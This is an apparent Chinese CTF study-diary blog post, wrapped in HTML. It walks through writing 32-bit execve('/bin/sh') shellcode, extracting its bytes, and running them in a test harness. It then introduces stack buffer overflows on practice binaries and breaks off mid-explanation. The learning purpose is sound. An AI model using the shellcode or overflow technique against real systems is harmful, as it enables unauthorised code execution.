@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="1学习日记5  shellcode 是一段机器指令，用于在溢出之后改变系统的正常流程，转而执行shellcode从而入侵目标系统。 shellcode基本的编写方式：  编写c程序实现功能 使用汇编来替代函数调用等 汇编编译链接，获取机器码  这里使用c语言来进行编写。 12345678#include&lt;stdio.h&gt;int main()&amp;#123;    char *name[2]">
+<meta property="og:type" content="article">
+<meta property="og:title" content="别碰我的柠檬">
+<meta property="og:url" content="http://example.com/2021/06/30/ctfpwn5/index.html">
+<meta property="og:site_name" content="别碰我的柠檬">
+<meta property="og:description" content="1学习日记5  shellcode 是一段机器指令，用于在溢出之后改变系统的正常流程，转而执行shellcode从而入侵目标系统。 shellcode基本的编写方式：  编写c程序实现功能 使用汇编来替代函数调用等 汇编编译链接，获取机器码  这里使用c语言来进行编写。 12345678#include&lt;stdio.h&gt;int main()&amp;#123;    char *name[2]">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-06-30T09:42:36.438Z">
+<meta property="article:modified_time" content="2021-06-30T14:03:15.411Z">
+<meta property="article:author" content="FBC">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2021/06/30/ctfpwn5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/06/30/ctfpwn5/","path":"2021/06/30/ctfpwn5/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | 别碰我的柠檬</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">别碰我的柠檬</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">芒果</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">FBC</p>
+  <div class="site-description" itemprop="description">仅供学习</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/30/ctfpwn5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="FBC">
+      <meta itemprop="description" content="仅供学习">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="别碰我的柠檬">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-06-30 17:42:36 / Modified: 22:03:15" itemprop="dateCreated datePublished" datetime="2021-06-30T17:42:36+08:00">2021-06-30</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">学习日记5</span><br></pre></td></tr></table></figure>
+
+<p><strong>shellcode</strong></p>
+<p>是一段机器指令，用于在溢出之后改变系统的正常流程，转而执行shellcode从而入侵目标系统。</p>
+<p>shellcode基本的编写方式：</p>
+<ul>
+<li>编写c程序实现功能</li>
+<li>使用汇编来替代函数调用等</li>
+<li>汇编编译链接，获取机器码</li>
+</ul>
+<p>这里使用c语言来进行编写。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>],name,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中execve进行系统调用，通过name[0]提供的参数”/bin/sh”起一个shell。 execve（参数1，参数2，参数3） 参数1：命令所在路径 参数2：命令的集合 参数3：传递给执行文件的环境变量集尝试编译运行。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc shell.c -o shell</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./shell</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> u got it</span></span><br><span class="line">u got it</span><br></pre></td></tr></table></figure>
+
+<p>用gdb查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ gdb shell -q</span><br><span class="line">pwndbg: loaded 164 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from shell...(no debugging symbols found)...done.</span><br><span class="line">pwndbg&gt; disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000400596 &lt;+0&gt;: push   rbp</span><br><span class="line">   0x0000000000400597 &lt;+1&gt;: mov    rbp,rsp</span><br><span class="line">   0x000000000040059a &lt;+4&gt;: sub    rsp,0x20</span><br><span class="line">   0x000000000040059e &lt;+8&gt;: mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x00000000004005a7 &lt;+17&gt;:    mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x00000000004005ab &lt;+21&gt;:    xor    eax,eax</span><br><span class="line">   0x00000000004005ad &lt;+23&gt;:    mov    QWORD PTR [rbp-0x20],0x400674</span><br><span class="line">   0x00000000004005b5 &lt;+31&gt;:    mov    QWORD PTR [rbp-0x18],0x0</span><br><span class="line">   0x00000000004005bd &lt;+39&gt;:    mov    rax,QWORD PTR [rbp-0x20]</span><br><span class="line">   0x00000000004005c1 &lt;+43&gt;:    lea    rcx,[rbp-0x20]</span><br><span class="line">   0x00000000004005c5 &lt;+47&gt;:    mov    edx,0x0</span><br><span class="line">   0x00000000004005ca &lt;+52&gt;:    mov    rsi,rcx</span><br><span class="line">   0x00000000004005cd &lt;+55&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000004005d0 &lt;+58&gt;:    call   0x400480 &lt;execve@plt&gt;</span><br><span class="line">   0x00000000004005d5 &lt;+63&gt;:    mov    eax,0x0</span><br><span class="line">   0x00000000004005da &lt;+68&gt;:    mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x00000000004005de &lt;+72&gt;:    xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">   0x00000000004005e7 &lt;+81&gt;:    je     0x4005ee &lt;main+88&gt;</span><br><span class="line">   0x00000000004005e9 &lt;+83&gt;:    call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x00000000004005ee &lt;+88&gt;:    leave</span><br><span class="line">   0x00000000004005ef &lt;+89&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中关键点在 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004005c5 &lt;+47&gt;:   mov    edx,0x0</span><br><span class="line">0x00000000004005ca &lt;+52&gt;:   mov    rsi,rcx</span><br><span class="line">0x00000000004005cd &lt;+55&gt;:   mov    rdi,rax</span><br><span class="line">0x00000000004005d0 &lt;+58&gt;:   call   0x400480 &lt;execve@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>传递了三个参数并且call execve()。 直接使用这四条指令显然是不行的，shellcode需要能够独立运行并且尽量短小，这里的call 0x400480 &lt;execve@plt&gt;依赖plt表，前面的参数传递也依赖程序的数据段等，我们需要用汇编来重写这里的代码。 对于call 0x400480 &lt;execve@plt&gt;，我们可以用系统调用来重写，execve的调用号为：0xb，那么就有 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,0xb</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>这里的0x80是根据al的值进行系统调用。 为了传参方便，这里采用32位汇编的写法，把参数push到栈上就可以传递参数了。 先将”/bin/sh”压栈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br></pre></td></tr></table></figure>
+
+<p>注意这里用xor eax,eax把eax置0，不使用mov eax,0的原因是这样会出现\x00，shellcode会被gets()这类函数截断。 esp指向当前栈顶，此时即指向”/bin/sh”,我们把esp保存到ebx </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,esp</span><br></pre></td></tr></table></figure>
+
+<p>现在把两个参数压栈，eax为NULL(0)，ebx为”/bin/sh”的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push eax</span><br><span class="line">push ebx</span><br></pre></td></tr></table></figure>
+
+<p>此时esp指向数组argv，把它赋值给ecx。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,esp</span><br><span class="line">xor edx,edx</span><br><span class="line">mov al,0xb</span><br><span class="line">int 0x80       ;通过中断0x80进行系统调用</span><br></pre></td></tr></table></figure>
+
+<p>所以有完整的代码： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov ecx,esp</span><br><span class="line">xor edx,edx</span><br><span class="line">mov al,0xb</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>保存为shell.asm，使用nasm编译，链接，运行（nasm可以使用 sudo apt-get install nasm 进行安装）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nasm -f elf32 shell.asm -o shell.o</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ld -m elf_i386 -o shell shell.o</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./shell</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> u got it</span></span><br><span class="line">u got it</span><br></pre></td></tr></table></figure>
+
+<p>成功了，使用objdump提取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d shell</span><br><span class="line">shell:     file format elf32-i386</span><br><span class="line">Disassembly of section .text:</span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:   31 c0                   xor    %eax,%eax</span><br><span class="line"> 8048062:   50                      push   %eax</span><br><span class="line"> 8048063:   68 2f 2f 73 68          push   $0x68732f2f</span><br><span class="line"> 8048068:   68 2f 62 69 6e          push   $0x6e69622f</span><br><span class="line"> 804806d:   89 e3                   mov    %esp,%ebx</span><br><span class="line"> 804806f:   50                      push   %eax</span><br><span class="line"> 8048070:   53                      push   %ebx</span><br><span class="line"> 8048071:   89 e1                   mov    %esp,%ecx</span><br><span class="line"> 8048073:   31 d2                   xor    %edx,%edx</span><br><span class="line"> 8048075:   b0 0b                   mov    $0xb,%al</span><br><span class="line"> 8048077:   cd 80                   int    $0x80</span><br></pre></td></tr></table></figure>
+
+<p>这样就提取到了,下面可以写个c程序验证一下。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line">char shellcode[]=&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    void (*fp) (void);</span><br><span class="line">    fp=(void *)shellcode;</span><br><span class="line">    fp();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gcc auth.c -fno-stack-protector -o auth -z execstack -m32</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./auth</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> u got it</span></span><br><span class="line">u got it</span><br></pre></td></tr></table></figure>
+
+<p><strong>栈溢出之篡改邻近变量</strong></p>
+<ol>
+<li>通过-fno-stack-protector和-m32参数从gcc编译stack0.c文件。</li>
+<li>运行编译后的程序，通过缓冲区溢出修改与字符串数组相邻的变量，得到输出”you     have changed the ‘modified’ variable”</li>
+<li>运行stack1程序，通过栈溢出得到输出”you     have correctly got the variable to the right value”</li>
+</ol>
+<p>缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。</p>
+<p><strong>栈溢出之ShellCode简例</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnthis</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+0h] [bp-48h]@1</span></span><br><span class="line"><span class="keyword">return</span> gets(&amp;s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;code flow successfully changed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:08048454 ; ==== S U B R O U T I N E ==========================================================================</span><br><span class="line">.text:08048454</span><br><span class="line">.text:08048454 ; Attributes: bp-based frame</span><br><span class="line">.text:08048454</span><br><span class="line">.text:08048454                 public pwnthis</span><br><span class="line">.text:08048454 pwnthis         proc near               ; CODE XREF: main+11p</span><br><span class="line">.text:08048454</span><br><span class="line">.text:08048454 s               = byte ptr -48h</span><br><span class="line">.text:08048454</span><br><span class="line">.text:08048454                 push    ebp</span><br><span class="line">.text:08048455                 mov     ebp, esp</span><br><span class="line">.text:08048457                 sub     esp, 48h</span><br><span class="line">.text:0804845A                 sub     esp, 0Ch</span><br><span class="line">.text:0804845D                 lea     eax, [ebp+s]</span><br><span class="line">.text:08048460                 push    eax             ; s</span><br><span class="line">.text:08048461                 call    _gets</span><br><span class="line">.text:08048466                 add     esp, 10h</span><br><span class="line">.text:08048469                 nop</span><br><span class="line">.text:0804846A                 leave</span><br><span class="line">.text:0804846B                 retn</span><br><span class="line">.text:0804846B pwnthis         endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>pwnthis()函数中有且仅有一个危险函数gets(&amp;s);,目标仍然是跳转到函数win()上获得输出code flow successfully changed。</p>
+<p>在IDA pro中双击 char s查看栈的结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">-00000048 s               db ?</span><br><span class="line">-00000047                 db ? ; undefined</span><br><span class="line">-00000046                 db ? ; undefined</span><br><span class="line">-00000045                 db ? ; undefined</span><br><span class="line">-00000044                 db ? ; undefined</span><br><span class="line">-00000043                 db ? ; undefined</span><br><span class="line">-00000042                 db ? ; undefined</span><br><span class="line">-00000041                 db ? ; undefined</span><br><span class="line">-00000040                 db ? ; undefined</span><br><span class="line">-0000003F                 db ? ; undefined</span><br><span class="line">-0000003E                 db ? ; undefined</span><br><span class="line">-0000003D                 db ? ; undefined</span><br><span class="line">-0000003C                 db ? ; undefined</span><br><span class="line">-0000003B                 db ? ; undefined</span><br><span class="line">-0000003A                 db ? ; undefined</span><br><span class="line">-00000039                 db ? ; undefined</span><br><span class="line">-00000038                 db ? ; undefined</span><br><span class="line">-00000037                 db ? ; undefined</span><br><span class="line">-00000036                 db ? ; undefined</span><br><span class="line">-00000035                 db ? ; undefined</span><br><span class="line">-00000034                 db ? ; undefined</span><br><span class="line">-00000033                 db ? ; undefined</span><br><span class="line">-00000032                 db ? ; undefined</span><br><span class="line">-00000031                 db ? ; undefined</span><br><span class="line">-00000030                 db ? ; undefined</span><br><span class="line">-0000002F                 db ? ; undefined</span><br><span class="line">-0000002E                 db ? ; undefined</span><br><span class="line">-0000002D                 db ? ; undefined</span><br><span class="line">-0000002C                 db ? ; undefined</span><br><span class="line">-0000002B                 db ? ; undefined</span><br><span class="line">-0000002A                 db ? ; undefined</span><br><span class="line">-00000029                 db ? ; undefined</span><br><span class="line">-00000028                 db ? ; undefined</span><br><span class="line">-00000027                 db ? ; undefined</span><br><span class="line">-00000026                 db ? ; undefined</span><br><span class="line">-00000025                 db ? ; undefined</span><br><span class="line">-00000024                 db ? ; undefined</span><br><span class="line">-00000023                 db ? ; undefined</span><br><span class="line">-00000022                 db ? ; undefined</span><br><span class="line">-00000021                 db ? ; undefined</span><br><span class="line">-00000020                 db ? ; undefined</span><br><span class="line">-0000001F                 db ? ; undefined</span><br><span class="line">-0000001E                 db ? ; undefined</span><br><span class="line">-0000001D                 db ? ; undefined</span><br><span class="line">-0000001C                 db ? ; undefined</span><br><span class="line">-0000001B                 db ? ; undefined</span><br><span class="line">-0000001A                 db ? ; undefined</span><br><span class="line">-00000019                 db ? ; undefined</span><br><span class="line">-00000018                 db ? ; undefined</span><br><span class="line">-00000017                 db ? ; undefined</span><br><span class="line">-00000016                 db ? ; undefined</span><br><span class="line">-00000015                 db ? ; undefined</span><br><span class="line">-00000014                 db ? ; undefined</span><br><span class="line">-00000013                 db ? ; undefined</span><br><span class="line">-00000012                 db ? ; undefined</span><br><span class="line">-00000011                 db ? ; undefined</span><br><span class="line">-00000010                 db ? ; undefined</span><br><span class="line">-0000000F                 db ? ; undefined</span><br><span class="line">-0000000E                 db ? ; undefined</span><br><span class="line">-0000000D                 db ? ; undefined</span><br><span class="line">-0000000C                 db ? ; undefined</span><br><span class="line">-0000000B                 db ? ; undefined</span><br><span class="line">-0000000A                 db ? ; undefined</span><br><span class="line">-00000009                 db ? ; undefined</span><br><span class="line">-00000008                 db ? ; undefined</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004                 db ? ; undefined</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br></pre></td></tr></table></figure>
+
+<p>其中 48处的s是指字符数组s，00处的s指保存在栈上的寄存器，r指的是返回地址，我们的目标就是覆盖返回地址，使函数在执行ret指令时，将我们覆盖的返回地址的值pop弹出到eip，从而改变程序的执行流。</p>
